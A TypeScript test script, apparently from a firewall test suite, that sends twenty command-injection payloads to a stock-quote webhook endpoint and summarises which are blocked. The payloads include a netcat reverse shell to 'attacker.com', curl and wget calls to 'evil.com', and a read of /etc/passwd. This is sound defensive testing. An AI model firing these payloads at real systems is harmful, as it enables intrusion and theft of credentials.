import { finishWithExit, printFailures, printSummary, runBatches, logger, testUserAgents } from "../firewall/_helpers.ts";
import type { RequestSpec } from "../firewall/_helpers.ts";

const targetPath = "/api/webhook?action=quote";

async function main(): Promise<void> {
  const cmdPayloads = [
    "AAPL; ls -la",
    "AAPL && ls",
    "AAPL | whoami",
    "AAPL`id`",
    "AAPL$(whoami)",
    "AAPL\nls",
    "AAPL%0Als",
    "AAPL && curl http://evil.com",
    "AAPL; wget http://evil.com",
    "AAPL' system('id')--",
    "AAPL| nc -e /bin/sh attacker.com 1234",
    "AAPL; cat /etc/passwd",
    "AAPL&& curl -X POST http://evil.com",
    "AAPL; env",
    "AAPL| bash -c 'ls'",
    "AAPL; echo $PATH",
    "AAPL&& python -c 'import socket...'",
    "AAPL; tee /tmp/pwned",
    "AAPL| sh -i",
    "AAPL; sleep 10",
  ];

  const specs: RequestSpec[] = cmdPayloads.map((payload, index) => ({
    id: index,
    label: `cmd-${payload.substring(0, 15)}`,
    method: "GET",
    path: `${targetPath}&symbol=${encodeURIComponent(payload)}&period=1d`,
    userAgent: testUserAgents[index % testUserAgents.length],
    fakeIp: undefined,
  }));

  logger.step(`Testing ${specs.length} command injection payloads`);
  const results = await runBatches(specs, 4);
  printSummary("Command Injection Attacks", results);
  printFailures(results, 30);
  finishWithExit(results);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});